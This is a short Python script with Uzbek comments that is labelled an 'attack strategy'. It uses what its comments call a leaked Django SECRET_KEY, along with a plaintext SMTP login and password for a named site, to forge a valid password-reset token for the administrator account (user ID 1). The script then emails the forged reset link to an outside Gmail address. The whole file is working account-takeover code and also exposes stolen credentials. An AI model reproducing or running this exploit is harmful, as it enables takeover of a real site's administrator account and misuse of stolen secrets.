import os
import django
from django.conf import settings
from django.core.mail import send_mail
from django.contrib.auth.tokens import default_token_generator
from django.utils.http import urlsafe_base64_encode
from django.utils.encoding import force_bytes
from django.contrib.auth import get_user_model

# 1. SOZLAMALAR (Bular fosh bo'lgan ma'lumotlar)
SEC_KEY = 'django-insecure-@l9-...)n8q*$_k(q9_vnv4@vjp&f8%&08+&1zm8&$vd0tp9ye12' # Haqiqiy SECRET_KEY ni qo'ying
EMAIL_USER = 'info@china-asic.com'
EMAIL_PASS = 'asic-China2025?'

if not settings.configured:
    settings.configure(
        SECRET_KEY=SEC_KEY,
        EMAIL_BACKEND='django.core.mail.backends.smtp.EmailBackend',
        EMAIL_HOST='smtp.beget.com',
        EMAIL_PORT=465,
        EMAIL_USE_SSL=True,
        EMAIL_HOST_USER=EMAIL_USER,
        EMAIL_HOST_PASSWORD=EMAIL_PASS,
        DEFAULT_FROM_EMAIL=EMAIL_USER,
        INSTALLED_APPS=['django.contrib.auth', 'django.contrib.contenttypes'],
    )
    django.setup()

# 2. HUJUM STRATEGIYASI
def generate_real_reset_link(user_id, user_email):
    User = get_user_model()
    # Haqiqiy bazaga ulanish shart emas, bizga faqat User obyekti kerak
    # Django tokenni User ning ID si, paroli va oxirgi loginiga qarab yasaydi
    user = User(pk=user_id, email=user_email)
    
    # Token va UID generatsiya qilish
    token = default_token_generator.make_token(user)
    uid = urlsafe_base64_encode(force_bytes(user.pk))
    
    # Haqiqiy link formati
    real_link = f"https://china-asic.com/reset/{uid}/{token}/"
    return real_link

# 3. IJRO
target_user_id = 1 # Adminning ID si odatda 1 bo'ladi
target_email = "bahodirovm260@gmail.com"

link = generate_real_reset_link(target_user_id, target_email)

print(f"🔥 HAQIQIY RESET LINKI YARATILDI:\n{link}")

# Endi bu linkni pochtaga yuboramiz
send_mail(
    "Xavfsizlik tizimi: Parolni tiklash",
    f"Profilingizni tiklash uchun bosing: {link}",
    EMAIL_USER,
    [target_email],
    fail_silently=False,
)
print(f"\n✅ Xat yuborildi! Endi pochtangizni tekshiring va linkni bosing.")